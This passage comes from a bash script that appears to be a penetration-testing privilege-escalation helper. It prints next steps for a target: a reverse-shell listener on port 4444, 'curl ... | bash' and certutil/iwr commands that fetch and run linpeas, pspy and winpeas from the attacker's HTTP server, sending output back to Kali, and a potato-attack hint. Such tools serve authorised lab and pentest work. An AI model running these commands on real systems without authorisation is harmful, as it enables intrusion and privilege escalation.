    echo -e "\n[NEXT STEPS]"
    echo "  1. Start listener NOW — before running enum commands on target:"
    echo "     penelope -p 4444 -O"
    echo ""
    echo "  2. Transfer tools to target (HTTP server running on port ${HTTP_PORT}):"
    if [[ "$target_os" == "linux" ]]; then
        echo "     curl http://${_kali_ip_final}:${HTTP_PORT}/linpeas.sh | bash"
        echo "     wget http://${_kali_ip_final}:${HTTP_PORT}/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64"
    else
        echo "     iwr -uri http://${_kali_ip_final}:${HTTP_PORT}/winpeas.exe -OutFile C:\\Users\\Public\\winpeas.exe"
        echo "     certutil -urlcache -split -f http://${_kali_ip_final}:${HTTP_PORT}/winpeas.exe C:\\Users\\Public\\winpeas.exe"
    fi
    echo ""
    echo "  3. Run generated commands on target:"
    echo "     # Copy-paste from: $target_dir/commands.txt"
    echo ""
    echo "  4. Exfil output back to Kali, then parse:"
    echo "     ./escalatr.sh --parse <output_file> --os ${target_os}"
    echo ""
    echo "  5. Read prioritised findings:"
    echo "     cat $target_dir/next_steps.txt"
    echo ""

    # Potato guide reminder for Windows
    if [[ "$target_os" == "windows" ]]; then
        warn "If you see SeImpersonatePrivilege: ./escalatr.sh --potato"
    fi

    if [[ "$serve_ok" == "true" ]]; then
        progress_log "$target_dir" "DONE" "escalatr" "complete"
    else
        progress_log "$target_dir" "FAIL" "escalatr" "serve_tools_failed"
        error "Tool serving failed"
        exit 1
    fi

    # Keep running if serving tools
    if [[ -n "$HTTP_SERVER_PID" ]] && kill -0 "$HTTP_SERVER_PID" 2>/dev/null; then
        info "HTTP server running — Ctrl+C to stop"
        wait "$HTTP_SERVER_PID" 2>/dev/null || true
    fi
}

if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
    # shellcheck disable=SC2317
    return 0 2>/dev/null || exit 0
fi

main "$@"
